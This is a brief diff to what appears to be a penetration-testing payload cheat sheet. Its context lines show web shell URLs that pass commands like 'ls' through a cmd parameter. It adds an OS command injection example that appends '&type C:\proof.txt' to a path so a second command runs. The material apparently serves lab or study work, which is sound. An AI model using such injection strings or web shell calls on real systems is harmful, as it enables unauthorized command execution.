@@ -224,3 +224,8 @@ http://ci-sandbox:80/webshell.php?cmd=ls -lsa
 
 http://192.168.152.121/backups/cmd.php?cmd=ls
 ```
+
+##### **OS Command Injection**
+```
+C:\backup"&type C:\proof.txt
+```
